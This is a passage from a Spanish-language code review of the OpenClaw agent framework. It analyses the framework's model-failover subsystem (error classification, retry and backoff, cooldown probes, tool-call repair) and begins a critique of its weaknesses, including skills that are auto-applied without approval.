Y no es un detalle menor: es uno de los subsistemas más grandes y más elaborados de todo OpenClaw.

> **Corrección de un hallazgo previo.** El análisis anterior concluyó que el failover automático
> entre proveedores **no estaba en el código**. Esa conclusión es **incorrecta**. Es el segundo
> caso en este trabajo (después de `src/skills/workshop/`, sección 0) en que una premisa dada
> resultó falsa al verificarla.
>
> Probablemente el análisis previo buscó la palabra en `packages/ai/` (el registro de proveedores),
> donde efectivamente **no hay nada de failover** — la capa de transporte es deliberadamente
> "tonta". El failover no vive en la capa de proveedor: vive **una capa más arriba**, en el
> *runner* del agente (`src/agents/**`), que es quien orquesta los reintentos y el cambio de
> modelo. Buscando ahí, aparece de inmediato.

Números de la verificación:

```
$ grep -rl "failover\|fallbackModel" --include=*.ts src packages | wc -l
172
```

172 archivos. **107 de ellos no son tests.** Los módulos núcleo suman ~3.700 líneas:

| Archivo | Líneas | Rol |
|---|---:|---|
| `src/agents/failover-error.ts` | 921 | clasificación de errores → `FailoverReason` |
| `src/agents/model-fallback-runner.ts` | 672 | **la máquina de estados del failover** |
| `src/agents/model-fallback-attempt.ts` | 663 | ejecución de un intento y su contabilidad |
| `src/agents/embedded-agent-helpers/failover-matches.ts` | 385 | matchers de texto de error por proveedor |
| `src/agents/embedded-agent-runner/run/assistant-failover.ts` | 387 | decisión en la fase "assistant" |
| `src/agents/model-fallback-candidates.ts` | 362 | resolución de la cadena ordenada |
| `src/agents/embedded-agent-runner/run/failover-policy.ts` | 285 | política de decisión por etapa |
| `src/agents/model-fallback-cooldown.ts` | 212 | cooldown, probes y throttling |
| `src/agents/embedded-agent-runner/run/failover-retry-controller.ts` | 169 | controlador de reintento |
| `src/agents/failover-policy.ts` | 49 | qué razones permiten probe en cooldown |

Ahora bien — y aquí está el matiz que probablemente originó la confusión — **el failover NO es
automático en el sentido de "descubre solo un proveedor alternativo"**. Es automático en la
*ejecución* pero **manual en la *configuración***: requiere una cadena ordenada declarada por el
usuario, y **esa cadena está vacía por defecto**.

Resumen del dictamen en una frase: *OpenClaw tiene una máquina de estados de failover de grado
industrial, que por defecto no tiene a dónde ir.*

---

### 6.1 Dónde NO está: la capa de proveedor es deliberadamente tonta

`[VERIFICADO EN CÓDIGO]`

En `packages/ai/src/api-registry.ts` (transcrito íntegro en 5.2) **no hay una sola línea de
reintento, fallback, cooldown o clasificación de error**. El adaptador hace una cosa: convertir
`(model, context, options)` en un stream de eventos. Si falla, falla.

Lo mismo en `src/provider-runtime/`, que contiene **exactamente dos archivos**
(`operation-retry.ts` y su test) y cuyo alcance es puramente transporte:

```ts
// src/provider-runtime/operation-retry.ts

export type ProviderOperationRetryStage = "read" | "poll" | "download" | "create";

const DEFAULT_TRANSIENT_PROVIDER_RETRY_OPTIONS = {
  attempts: 2,        // "Total executions, including the first call."
  baseDelayMs: 250,
  maxDelayMs: 1_000,
} as const satisfies TransientProviderRetryOptions;

function defaultTransientProviderRetryForStage(
  stage: ProviderOperationRetryStage,
): TransientProviderRetryConfig | undefined {
  return stage === "create" ? undefined : true;
}
```

Nótese el detalle de diseño: **la etapa `"create"` NO reintenta por defecto**. Las etapas
idempotentes (`read`, `poll`, `download`) sí. Es la distinción correcta entre operación segura de
repetir y operación que puede duplicar trabajo. `attempts: 2` significa "una llamada más un
reintento" — el comentario lo aclara explícitamente para que nadie lo lea como "dos reintentos".

Esta separación de capas es intencional y es el hallazgo arquitectónico de la sección:

```
  ┌──────────────────────────────────────────────┐
  │  src/agents/**  — RUNNER DEL AGENTE          │
  │  • clasifica el error → FailoverReason        │
  │  • decide: reintentar / rotar credencial /    │
  │    cambiar de modelo / rendirse               │
  │  • cooldown, probes, suspensión de sesión     │  ← AQUÍ está el failover
  └───────────────────┬──────────────────────────┘
                      │ (llama, y si truena, decide)
  ┌───────────────────▼──────────────────────────┐
  │  packages/ai/**  — REGISTRO DE PROVEEDORES   │
  │  • stream(model, context, options)           │  ← AQUÍ no hay nada de failover
  │  • cero política, cero reintentos             │
  └──────────────────────────────────────────────┘
```

---

### 6.2 Dónde SÍ está: `runWithModelFallback()`

`[VERIFICADO EN CÓDIGO]` — `src/agents/model-fallback-runner.ts`, cuya primera línea es su
descripción: *"Runs the ordered model fallback execution state machine."*

La firma de entrada, transcrita (los campos más relevantes):

```ts
type RunWithModelFallbackParams<T> = {
  cfg: OpenClawConfig | undefined;
  provider: string;
  model: string;
  runId?: string;
  sessionId?: string;
  agentId?: string;
  sessionKey?: string;
  lane?: string;
  agentDir?: string;
  /** Optional explicit fallbacks list; when provided (even empty), replaces agents.defaults.model.fallbacks. */
  fallbacksOverride?: string[];
  requestedRouteResolution?: ModelFallbackRouteResolution;
  run: ModelFallbackRunFn<T>;
  onError?: ModelFallbackErrorHandler;
  onFallbackStep?: ModelFallbackStepHandler;
  classifyResult?: ModelFallbackResultClassifier<T>;
  /** Return false when a thrown attempt committed work that must not be replayed. */
  canFallbackAfterError?: (params: {
    provider: string;
    model: string;
    error: unknown;
    attempt: number;
    total: number;
  }) => boolean | Promise<boolean>;
  mergeExhaustedResult?: (params: { latestResult: T; preferredResult: T }) => T;
  skipAuthProfileRuntime?: boolean;
  abortSignal?: AbortSignal;
} & ModelManifestNormalizationContext;

export async function runWithModelFallback<T>(
  params: RunWithModelFallbackParams<T>,
): Promise<ModelFallbackRunResult<T>> { … }
```

Dos campos merecen subrayado por su valor conceptual:

- **`canFallbackAfterError`** — *"Return false when a thrown attempt committed work that must not
  be replayed."* Es el reconocimiento explícito de que **el failover no siempre es seguro**: si el
  intento fallido ya ejecutó una herramienta con efecto lateral (escribió un archivo, mandó un
  mensaje), reintentar con otro modelo duplicaría el efecto. El caller es quien sabe eso y quien
  puede vetar el fallback. **Esto es exactamente el problema que O.R.I.O.N. tendría al reintentar
  un turno que ya ejecutó una skill amarilla.**
- **`mergeExhaustedResult`** — cuando la cadena se agota, hay que decidir qué resultado devolver:
  el último (más reciente) o el "preferido" (el mejor de todos los intentos). El runner delega esa
  decisión.

El resultado es un tipo con `outcome`, y uno de sus valores es `"exhausted"` (cadena agotada), que
además dispara la suspensión diferida de la sesión (`flushDeferredSessionSuspension`).

---

### 6.3 La cadena de candidatos: ordenada, explícita y VACÍA POR DEFECTO

`[VERIFICADO EN CÓDIGO]` — `src/agents/model-fallback-candidates.ts`, función
`resolveFallbackCandidatesUncached()`.

La cadena se construye en tres tramos, con deduplicación por `provider/model`:

```ts
// 1) El modelo solicitado (o el primario configurado si no hay override)
addCandidate(
  normalizeCandidateRef(requestedCandidate.provider, requestedCandidate.model),
  "requested",
  requestedRouteResolution,
);

// 2) Los fallbacks configurados, EN SU ORDEN DECLARADO
const modelFallbacks =
  params.fallbacksOverride !== undefined
    ? params.fallbacksOverride
    : resolveAgentModelFallbackValues(params.cfg?.agents?.defaults?.model);
for (const raw of modelFallbacks) {
  const resolved = resolveModelRefFromString({ … });
  if (!resolved) {
    continue;
  }
  // Fallbacks are explicit user intent; do not silently filter them by the
  // model allowlist.
  addCandidate(
    normalizeCandidateRef(resolved.ref.provider, resolved.ref.model),
    "configured-fallback",
    "resolved",
  );
}

// 3) El primario configurado, como último recurso
if (params.fallbacksOverride === undefined && primary?.provider && primary.model) {
  addCandidate(
    normalizeCandidateRef(primary.provider, primary.model),
    "configured-primary",
    "resolved",
  );
}
```

El dedup lo hace un colector con `Set<string>` sobre `modelKey(provider, model)`:

```ts
const addCandidate = (candidate, routeOrigin, routeResolution) => {
  if (!candidate.provider || !candidate.model) {
    return;
  }
  const key = modelKey(candidate.provider, candidate.model);
  if (seen.has(key)) {
    return;
  }
  seen.add(key);
  candidates.push({ ...candidate, routeOrigin, routeResolution });
};
```

Cada candidato lleva su **procedencia** (`routeOrigin`: `"requested"` / `"configured-fallback"` /
`"configured-primary"`), igual que las filas del catálogo llevan su `source` y los skills su
`source`. Es un patrón repetido en todo OpenClaw: **todo dato derivado recuerda de dónde vino**.

Y hay un comentario que vale como principio de diseño:

```ts
// Fallbacks are explicit user intent; do not silently filter them by the
// model allowlist.
```

Es decir: la *allowlist* de modelos filtra el descubrimiento, pero **no filtra lo que el usuario
declaró explícitamente como fallback**. Intención explícita gana sobre política implícita.

#### La configuración

`[VERIFICADO EN CÓDIGO]` — `src/config/schema.help.agents.ts` líneas 73-75:

```ts
"agents.defaults.model.primary": "Primary model (provider/model).",
"agents.defaults.model.fallbacks":
  "Ordered fallback models (provider/model). Used when the primary model fails.",
```

En config sería, por ejemplo:

```jsonc
{
  "agents": {
    "defaults": {
      "model": {
        "primary": "anthropic/claude-opus-4",
        "fallbacks": [
          "openai/gpt-5.6-sol",
          "google/gemini-2.5-pro",
          "groq/llama-3.3-70b"
        ]
      }
    }
  }
}
```

**Y aquí está el matiz decisivo:** `[VERIFICADO EN CÓDIGO]`

```ts
// src/config/model-input.ts
/** Returns configured fallback model refs, preserving their configured order. */
export function resolveAgentModelFallbackValues(model?: AgentModelInput): string[] {
  if (!model || typeof model !== "object") {
    return [];
  }
  return Array.isArray(model.fallbacks) ? model.fallbacks : [];
}
```

No hay ninguna lista de fallbacks por defecto en ningún sitio. `src/agents/defaults.ts` completo
en lo pertinente:

```ts
export const DEFAULT_PROVIDER = "openai";
export const DEFAULT_MODEL = "gpt-5.6-sol";
```

Se buscó `fallbacks:` en `src/config/defaults.ts` y `src/agents/defaults.ts`: **cero resultados**.

> **Conclusión matizada:** el failover **automático en ejecución** existe y es sofisticado. El
> failover **automático en configuración** (descubrir por su cuenta un proveedor alternativo con
> credenciales válidas y saltar ahí) **no existe**. Si el usuario no escribe la lista, la cadena
> tiene un solo eslabón y "failover" se reduce a reintento sobre el mismo modelo.
>
> Cualquier documentación que sugiera que OpenClaw "cambia solo de proveedor si uno se cae" es
> `[AFIRMACIÓN DE DOCUMENTACIÓN]` **parcialmente no respaldada**: cambia solo, sí, pero únicamente
> entre los modelos que el usuario listó a mano.

---

### 6.4 La clasificación de errores: 16 razones cerradas

`[VERIFICADO EN CÓDIGO]` — `src/agents/embedded-agent-helpers/types.ts`, transcrito completo:

```ts
/** Closed reason codes used by model failover and retry classification. */
export type FailoverReason =
  | "auth"
  | "auth_permanent"
  | "format"
  | "rate_limit"
  | "overloaded"
  | "billing"
  | "server_error"
  | "timeout"
  | "tls_certificate"
  | "context_overflow"
  | "model_not_found"
  | "session_expired"
  | "empty_response"
  | "no_error_details"
  | "unclassified"
  | "unknown";
```

**Este enum es la pieza más reutilizable de toda la sección 6 para O.R.I.O.N.** Es el vocabulario
compartido: todo lo demás (política de reintento, de rotación de credencial, de cooldown, de
revert de sesión) se expresa como conjuntos sobre estas 16 razones.

Distinciones finas que revelan experiencia de producción:

- **`auth` vs `auth_permanent`** — token expirado (recuperable refrescando) vs API key revocada
  (nunca va a funcionar). No tiene sentido reintentar la segunda.
- **`empty_response` vs `no_error_details` vs `unclassified` vs `unknown`** — cuatro sabores de
  "no sé qué pasó", que se tratan distinto. `unclassified` es "hubo error y no matcheó ningún
  patrón"; `no_error_details` es "el proveedor devolvió un fallo sin cuerpo".
- **`format`** — el modelo devolvió algo sintácticamente inválido (típicamente tool-calls mal
  formados). Se trata como error del *modelo*, no del *transporte*.
- **`context_overflow`** — tiene su propio camino de recuperación (compactar el contexto y
  reintentar), no failover.

#### Cómo se clasifica: matchers de texto por proveedor

`src/agents/embedded-agent-helpers/failover-matches.ts` (385 líneas) traduce mensajes de error
crudos a `FailoverReason`. Es un catálogo de la realidad de los proveedores:

```ts
const HIGH_CONFIDENCE_AUTH_PERMANENT_PATTERNS = [
  /api[_ ]?key[_ ]?(?:revoked|deactivated|deleted)/i,
  /deactivated[_ ]workspace/i,
  "key has been disabled",
  "key has been revoked",
  "account has been deactivated",
  "not allowed for this organization",
] as const satisfies readonly ErrorPattern[];

// Providers use both "invalid API key" and "API key is/not valid" word order.
// Keep them in one matcher so every result/exception classifier agrees on auth failover.
const INVALID_API_KEY_RE =
  /(?:invalid[_ ]?api[_ ]?key(?![a-z0-9])|api[_ ]?key(?:[_ ]?(?:is[_ ]?)?(?:invalid(?![a-z0-9])|not[_ ]?valid(?![a-z0-9]))))/i;

const ERROR_PATTERNS = {
  rateLimit: [
    /rate[_ ]limit|too many requests|429/,
    /too many (?:concurrent )?requests/i,
    /throttling(?:exception)?/i,
    "model_cooldown",
    "exceeded your current quota",
    "resource has been exhausted",
    "quota exceeded",
    "resource_exhausted",
    "throttled", "throttling",
    "usage limit",
    /\btpm\b/i,
    "tokens per minute",
    "tokens per day",
    // Chinese provider rate-limit messages
    "请求过于频繁", "调用频率", "频率限制",
    "配额不足", "配额已用尽", "额度不足", "额度已用尽",
  ],
  overloaded: [
    /overloaded_error|"type"\s*:\s*"overloaded_error"/i,
    "overloaded",
    /\b(?:selected\s+)?model\s+(?:is\s+)?at capacity\b/i,
    // Match "service unavailable" only when combined with an explicit overload
    // indicator — a generic 503 from a proxy/CDN should not be classified as
    // provider-overload (#32828).
    /service[_ ]unavailable.*(?:overload|capacity|high[_ ]demand)|(?:overload|capacity|high[_ ]demand).*service[_ ]unavailable/i,
    "high demand", "high load",
    "服务过载", "当前负载过高", "访问量过大",
  ],
  // …
};

// Códigos propietarios de proveedores concretos:
const ZAI_BILLING_CODE_1311_RE = /"code"\s*:\s*1311\b/;
const ZAI_AUTH_CODE_1113_RE = /"code"\s*:\s*1113\b/;   // Z.ai: 1113 = endpoint o credenciales (#48988)
const VOLCENGINE_INVALID_SUBSCRIPTION_RE = /"code"\s*:\s*"InvalidSubscription"/i;
```

**Lectura honesta:** esto es *regex sobre mensajes de error en lenguaje natural, en varios idiomas,
con referencias a issues de GitHub en los comentarios*. No es elegante. Es lo que hay que hacer
cuando los proveedores no exponen códigos de error normalizados. Los comentarios con número de
issue (`#32828`, `#48988`, `#90702`) son la prueba de que cada patrón se agregó después de un fallo
real en producción.

Para O.R.I.O.N. esto significa: **no hay atajo elegante para la clasificación de errores de LLM**.
Habrá que empezar con status HTTP (401/403/429/5xx) y agregar patrones a medida que aparezcan.

---

### 6.5 El failover NO es la primera respuesta: hay una escalera de cuatro peldaños

`[VERIFICADO EN CÓDIGO]` — `src/agents/embedded-agent-runner/run/failover-policy.ts`

Este es el archivo que decide qué hacer ante un fallo. Su tipo de decisión, transcrito:

```ts
/** Failover action selected for one embedded run failure decision point. */
type RunFailoverDecision =
  | { action: "continue_normal" }
  | { action: "rotate_profile" | "surface_error"; reason: FailoverReason | null }
  | { action: "fallback_model"; reason: FailoverReason }
  | { action: "return_error_payload" };
```

**Cambiar de modelo (`fallback_model`) es la tercera opción, no la primera.** El orden real de
escalada es:

```
  1. reintentar el mismo modelo          (retry con backoff — packages/retry)
        │ sigue fallando
        ▼
  2. rotar credencial                     ("rotate_profile" — otra API key / perfil
        │ sigue fallando                   del MISMO proveedor)
        ▼
  3. cambiar de modelo/proveedor          ("fallback_model" — siguiente candidato
        │ cadena agotada                    de la cadena)
        ▼
  4. rendirse                             ("surface_error" / "return_error_payload"
                                            + suspensión de sesión)
```

El peldaño 2 (`rotate_profile`) es una dimensión que se pierde fácilmente: OpenClaw soporta
**varios perfiles de credencial para el mismo proveedor** (`src/agents/auth-profiles/**`), con su
propio estado de uso, ventanas de bloqueo y motivos (`blockedUntil`, `blockedReason`,
`blockedSource`, `blockedModel`). Antes de abandonar un proveedor, prueba con otra llave.

Y la decisión se toma **por etapa** del turno, con parámetros distintos en cada una:

```ts
type RetryLimitDecisionParams = {
  stage: "retry_limit";
  fallbackConfigured: boolean;
  failoverReason: FailoverReason | null;
};

type PromptDecisionParams = {
  stage: "prompt";
  allowFormatRetry?: boolean;
  aborted: boolean;
  externalAbort: boolean;
  fallbackConfigured: boolean;
  failoverCode?: string;
  failoverFailure: boolean;
  failoverReason: FailoverReason | null;
  harnessOwnsTransport?: boolean;
  promptTimeoutFallbackSafe?: boolean;
  timedOutByRunBudget?: boolean;
  profileRotated: boolean;
};

type AssistantDecisionParams = {
  stage: "assistant";
  allowFormatRetry?: boolean;
  terminal: AgentRunAttemptTerminal;
  signalOwnedInterruption?: boolean;
  fallbackConfigured: boolean;
  failoverFailure: boolean;
  failoverReason: FailoverReason | null;
  harnessOwnsTransport?: boolean;
  profileRotated: boolean;
};
```

Reglas concretas transcritas, que muestran el nivel de detalle:

```ts
function shouldEscalateRetryLimit(reason: FailoverReason | null): boolean {
  return Boolean(
    reason && reason !== "timeout" && reason !== "format" && reason !== "session_expired",
  );
}

function shouldRotatePrompt(params: PromptDecisionParams): boolean {
  if (params.timedOutByRunBudget) {
    return false;
  }
  return (
    params.failoverFailure &&
    params.failoverReason !== "timeout" &&
    params.failoverReason !== "tls_certificate" &&
    !isTerminalFormatFailure(params)
  );
}
```

Traducido: un **timeout** no justifica rotar credencial (la llave está bien, el servidor tardó);
un **error de certificado TLS** tampoco (es un problema de red local, no de credencial); y si se
agotó el presupuesto de tiempo del run, no se rota nada porque no hay tiempo para intentar de nuevo.

---

### 6.6 Cooldown: para no machacar un proveedor caído, y para no abandonarlo para siempre

`[VERIFICADO EN CÓDIGO]` — `src/agents/model-fallback-cooldown.ts` (212 líneas) y
`src/agents/failover-policy.ts` (49 líneas, transcrito completo abajo).

Cuando un modelo falla, entra en *cooldown*: se salta en los intentos siguientes. Pero saltarlo
para siempre sería peor, así que existe el concepto de **probe**: de vez en cuando se le da una
oportunidad para ver si ya se recuperó.

`src/agents/failover-policy.ts`, íntegro:

```ts
/**
 * Shared failover policy helpers for auth profile cooldown probing.
 */
import type { FailoverReason } from "./embedded-agent-helpers.js";

/** Returns true when a failed model can be probed during cooldown. */
export function shouldAllowCooldownProbeForReason(
  reason: FailoverReason | null | undefined,
): boolean {
  return (
    reason === "rate_limit" ||
    reason === "overloaded" ||
    reason === "billing" ||
    reason === "unknown" ||
    reason === "empty_response" ||
    reason === "no_error_details" ||
    reason === "unclassified" ||
    reason === "timeout"
  );
}

/** Returns true when a transient failure should consume a cooldown probe slot. */
export function shouldUseTransientCooldownProbeSlot(
  reason: FailoverReason | null | undefined,
): boolean {
  return (
    reason === "rate_limit" ||
    reason === "overloaded" ||
    reason === "unknown" ||
    reason === "empty_response" ||
    reason === "no_error_details" ||
    reason === "unclassified" ||
    reason === "timeout"
  );
}

/** Returns true when a non-transient failure should leave transient probe budget intact. */
export function shouldPreserveTransientCooldownProbeSlot(
  reason: FailoverReason | null | undefined,
): boolean {
  return (
    reason === "model_not_found" ||
    reason === "format" ||
    reason === "auth" ||
    reason === "auth_permanent" ||
    reason === "session_expired" ||
    reason === "tls_certificate"
  );
}
```

La idea, en una línea: **las razones transitorias gastan presupuesto de probe; las permanentes no.**
Si un modelo no existe (`model_not_found`) o la llave está revocada (`auth_permanent`), sondearlo
no tiene sentido y no debe consumir el cupo de sondeos que sí sirve para un rate limit.

Las constantes de throttling:

```ts
// src/agents/model-fallback-cooldown.ts
const lastProbeAttempt = new Map<string, number>();
const MIN_PROBE_INTERVAL_MS = 30_000;              // 30 s entre probes por clave
const PROBE_MARGIN_MS = 2 * 60 * 1000;             // 2 min de margen sobre el reset declarado
const PROBE_SCOPE_DELIMITER = "::";
const PROBE_STATE_TTL_MS = 24 * 60 * 60 * 1000;    // el estado de probe caduca a las 24 h
const MAX_PROBE_KEYS = 256;                        // cota de memoria, evicción del más viejo

export function resolveProbeThrottleKey(provider: string, agentDir?: string): string {
  const scope = normalizeOptionalString(agentDir) ?? "";
  return scope ? `${scope}${PROBE_SCOPE_DELIMITER}${provider}` : provider;
}
```

Y el caso que más enseña, con su comentario original completo — resuelve exactamente el problema
del usuario **sin cadena de fallback configurada**:

```ts
function shouldProbePrimaryDuringCooldown(params: { … }): boolean {
  if (!params.isPrimary || !isProbeThrottleOpen(params.now, params.throttleKey)) {
    return false;
  }

  // A single-provider primary has no fallback chain to prefer, so every open
  // throttle slot is a recovery probe: "is the primary callable yet?" is a
  // recovery question independent of fallback configuration. Without this, a
  // fallbacks:[] setup that hits a rate/subscription cap stays suspended until
  // the provider-reported reset (which can be days out) even though the rolling
  // cap usually recovers earlier. See #90702.
  if (!params.hasFallbackCandidates) {
    return true;
  }
  // …
}
```

Es decir: cuando **no hay fallbacks configurados** (el caso por defecto, sección 6.3), la política
de probe cambia por completo, porque no hay a dónde ir y lo único que queda es preguntar
"¿ya volvió?". El comentario documenta el bug real que lo motivó (`#90702`): un usuario con
`fallbacks: []` que tocaba un tope de suscripción quedaba suspendido **días**, aunque el tope real
se recuperase antes.

---

### 6.7 Auto-revert: deshacer un cambio de modelo que resultó malo

`[VERIFICADO EN CÓDIGO]` — `src/agents/session-model-auto-revert.ts`

*"One-run rollback for agent-selected session models."* Cuando el agente cambia el modelo de una
sesión y ese cambio falla, se revierte. Pero **solo por ciertas razones**, y el comentario explica
por qué:

```ts
// Revert only when the chosen model is definitively unusable. Transient
// provider states (rate_limit/overloaded/timeout/server_error) hit working
// models too; reverting on them would undo a valid choice.
const REVERT_REASONS = new Set<FailoverReason>([
  "auth",
  "auth_permanent",
  "billing",
  "model_not_found",
]);
```

Solo 4 de las 16 razones disparan revert. El razonamiento es fino: un `rate_limit` le pasa también
a un modelo perfectamente bueno, así que revertir por eso destruiría una elección válida. Solo se
revierte cuando el modelo es **definitivamente inservible**.

Los desenlaces posibles son `"cleared" | "promoted" | "reverted" | "kept" | "none"` — nótese
`"promoted"`: si el modelo elegido funciona, se *promueve* de elección tentativa a elección firme.

---

### 6.8 `packages/retry` — el backoff, aislado y sin dependencias

`[VERIFICADO EN CÓDIGO]` — `packages/retry/src/index.ts`. Un paquete de propósito general, sin
relación con LLMs, que el failover usa como primitiva. Vale la pena por su rigor.

```ts
export type BackoffPolicy = {
  initialMs: number;
  maxMs: number;
  factor: number;
  jitter: number;
};

export function computeBackoff(policy: BackoffPolicy, attempt: number): number {
  const base = Math.min(policy.maxMs, policy.initialMs * policy.factor ** Math.max(attempt - 1, 0));
  const jitter = base * policy.jitter * Math.random();
  return Math.min(policy.maxMs, Math.round(base + jitter));
}

const DEFAULT_RETRY_CONFIG: Required<RetryConfig> = {
  attempts: 3,
  minDelayMs: 300,
  maxDelayMs: 30_000,
  jitter: 0,
};

export type RetryOptions = RetryConfig & {
  label?: string;
  shouldRetry?: (err: unknown, attempt: number) => boolean;
  retryAfterMs?: (err: unknown) => number | undefined;
  retryAfterMaxDelayMs?: number;
  delayMs?: number | ((context: RetryDelayContext) => number);
  onRetry?: (info: RetryInfo) => unknown;
  random?: () => number;   // ← inyectable para tests deterministas
  sleep?: (ms: number) => Promise<void>;  // ← idem
};
```

Detalles que separan un retry de juguete de uno de producción:

1. **Honra `Retry-After` del servidor** (`retryAfterMs`), con un tope propio
   (`retryAfterMaxDelayMs`) para que un servidor no pueda pedir una espera infinita.
2. **Dos modos de jitter, y la razón está comentada:**
   ```ts
   // Honorable Retry-After hints use positive jitter. Only an over-cap,
   // already-unsatisfiable hint may spread downward to avoid lockstep.
   ```
   Si el servidor pidió esperar 10 s, el jitter debe ser **hacia arriba** (esperar 10-12 s), nunca
   hacia abajo — bajarlo violaría la petición. Solo cuando el hint excede el tope y ya es
   inalcanzable, se dispersa hacia abajo para que no todos los clientes reintenten en el mismo
   instante. Y el redondeo lo respeta:
   ```ts
   // Retry-After is a lower bound. Positive jitter must round upward or a
   // fractional server hint can be undercut even with a zero random draw.
   ```
3. **`sleepWithAbort()`** — la espera es cancelable por `AbortSignal`, con limpieza del listener y
   `timer.unref?.()` opcional:
   ```ts
   // Retry loops can stay abortable without keeping an otherwise idle process alive.
   ```
4. **`RetrySupervisor`** — una clase con estado (`attempts`, `nextDelayOverrideMs`) para bucles de
   reconexión largos (WebSocket, streams), separada de la función `retryAsync` de un solo disparo.
5. **`random` y `sleep` son inyectables** — los tests no duermen de verdad.

---

### 6.9 `packages/tool-call-repair` — no es failover, es reparación de formato

`[VERIFICADO EN CÓDIGO]` — `packages/tool-call-repair/src/`

Se examinó porque la consigna lo pedía. **No tiene relación con el failover entre proveedores.**
Resuelve otra cosa: cuando un modelo, en vez de emitir una tool-call estructurada, la escribe como
**texto plano** dentro de su respuesta, este paquete la detecta, la parsea y la **promueve** a
tool-call real.

```ts
/** Public repair utilities for model-emitted plain-text tool calls. */
export {
  parseStandalonePlainTextToolCallBlocks,
  stripPlainTextToolCallBlocks,
  type PlainTextToolCallBlock,
} from "./payload.js";
export {
  normalizePlainTextToolCallStreamEvents,
  projectScrubbedPlainTextToolCallMessage,
} from "./stream-normalizer.js";
export {
  createPromotedPlainTextToolCallBlock,
  createPromotedPlainTextToolCallEvents,
  projectStandalonePlainTextToolCallMessage,
} from "./promote.js";
```

Sus barandillas son notables, y son de seguridad:

```ts
/** Parser limits and allowlist options for plain-text tool-call repair. */
export type PlainTextToolCallParseOptions = {
  /** Optional allowlist of tool names that may be repaired. */
  allowedToolNames?: Iterable<string>;
  /** Maximum serialized payload size accepted for one repaired call. */
  maxPayloadBytes?: number;
};

/** Source range that must remain literal user-visible text. */
export type PlainTextToolCallProtectedRange = { end: number; start: number };

/** Resolves protected ranges against the exact text about to be scanned. */
export type PlainTextToolCallProtectedRangeResolver = (
  text: string,
) => readonly PlainTextToolCallProtectedRange[];
```

- **Allowlist de nombres de herramienta**: solo se repara lo que ya está permitido. Un modelo no
  puede inventar una herramienta nueva escribiéndola en texto plano.
- **Rangos protegidos**: hay zonas del texto (típicamente bloques de código que el usuario pidió
  ver) donde algo que *parece* una tool-call **debe quedarse como texto**. Sin esto, pedirle al
  modelo "mostrame un ejemplo de llamada a la herramienta X" podría **ejecutar** X.
- **`maxPayloadBytes`**: cota de tamaño.

Su relación con el failover es indirecta pero real: la razón `format` de `FailoverReason` existe
justamente porque este tipo de fallo ocurre, y la reparación es lo que se intenta **antes** de
clasificar el turno como fallo de formato y escalar.

---

### 6.10 Otro failover distinto: `manager.backend-failover.ts` (ACP)

`[VERIFICADO EN CÓDIGO]` — `src/acp/control-plane/manager.backend-failover.ts`

Existe un **segundo** subsistema de failover, sin relación con el de modelos: el del *control
plane* de ACP, que hace failover entre **backends** (procesos/hosts que ejecutan agentes), no entre
proveedores LLM. Se registra aquí para evitar confusión al buscar por la palabra "failover":
`manager.backend-failover.ts`, `manager.failover.test.ts` y `manager.turn-runner.ts` pertenecen a
esa otra capa.

---

### 6.11 Tabla-resumen del dictamen

| Pregunta | Respuesta | Evidencia |
|---|---|---|
| ¿Existe failover automático entre proveedores? | **Sí**, máquina de estados completa | `src/agents/model-fallback-runner.ts` (672 líneas) |
| ¿Está en la capa de proveedor (`packages/ai`)? | **No.** Cero política ahí | `api-registry.ts` no menciona retry ni fallback |
| ¿Se activa solo, sin configurar nada? | **No.** Cadena vacía por defecto | `resolveAgentModelFallbackValues()` → `[]`; sin defaults en `defaults.ts` |
| ¿Cómo se configura? | Lista ordenada de `provider/model` | `agents.defaults.model.fallbacks` |
| ¿Cambiar de modelo es la primera reacción? | **No**, es la tercera | `RunFailoverDecision`: retry → `rotate_profile` → `fallback_model` → rendirse |
| ¿Se rota credencial antes de cambiar de proveedor? | **Sí** | `"rotate_profile"`, `src/agents/auth-profiles/**` |
| ¿Hay reintentos con backoff? | **Sí**, con `Retry-After`, jitter direccional y abort | `packages/retry/src/index.ts` |
| ¿Hay cooldown y recuperación? | **Sí**, con probes throttleados a 30 s y TTL de 24 h | `model-fallback-cooldown.ts` |
| ¿Se protege contra reintentar trabajo con efectos laterales? | **Sí**, con veto del caller | `canFallbackAfterError` |
| ¿Se deshace un cambio de modelo malo? | **Sí**, solo por 4 de 16 razones | `session-model-auto-revert.ts` |
| ¿`tool-call-repair` es failover? | **No**, es reparación de formato | `packages/tool-call-repair/` |
| ¿Cuántas razones de fallo se distinguen? | **16**, enum cerrado | `FailoverReason` |
| ¿Cómo se clasifica el error? | Regex sobre texto, multi-idioma, por vendor | `failover-matches.ts` (385 líneas) |

---

## 7. Límites y debilidades reales

Esta sección es deliberadamente crítica. OpenClaw es un sistema muy competente, y precisamente por
eso conviene ser preciso sobre dónde no llega — copiar sus defectos junto con sus virtudes sería
el peor resultado posible de este análisis.

Cada punto marca si es `[VERIFICADO EN CÓDIGO]` o `[AFIRMACIÓN DE DOCUMENTACIÓN]` no respaldada.

---

### 7.1 La debilidad mayor: auto-aplicación de skills sin aprobación, justificada por un comentario falso

`[VERIFICADO EN CÓDIGO]` — desarrollado en la sección 4.

El default es `autonomous: { mode: "auto" }` y `approvalPolicy: "auto"`. Un **solo** mensaje del
usuario que matchee **una** de 17 regex genera un skill y **lo escribe en disco sin preguntar**.

Lo que eleva esto de "decisión de producto discutible" a **debilidad real** es que el propio código
contiene la justificación equivocada. En `src/skills/research/signals.ts`:

```ts
// we accept rare miscaptures because a capture only creates a pending proposal
// a human must apply
```

**Esa premisa es falsa bajo la configuración por defecto.** El test
`autocapture-auto-apply.test.ts` (`"auto-applies deterministic capture by default"`) demuestra lo
contrario: sin config, un mensaje, `status: "applied"`, archivo en disco.

El comentario probablemente fue cierto cuando se escribió y quedó obsoleto al cambiar el default.
Es el tipo de deriva más peligroso que existe: **una barandilla que solo existe en un comentario**.
Todo el razonamiento de tolerancia al falso positivo del regex (17 patrones amplios, sin umbral de
repetición, sin ventana temporal) descansa sobre una red que ya no está.

Y el problema se agrava al combinarse con la precedencia de fuentes (sección 3.1): los skills
auto-capturados se escriben en `workspace` / `.agents/skills`, que son los **niveles 5 y 6** de
precedencia. Es decir, **el nivel más alto**. Un skill auto-generado por un falso positivo puede
**sombrear silenciosamente un skill del producto** con el mismo nombre.

---

### 7.2 El escáner de seguridad es la única barandilla, y solo bloquea `critical`

`[VERIFICADO EN CÓDIGO]` — `src/skills/workshop/proposal-scan.ts`:

```ts
state: critical > 0 ? "failed" : "clean"
```

`warn` **no bloquea**. Y en `src/skills/security/scanner.ts`, las reglas `destructive-delete`
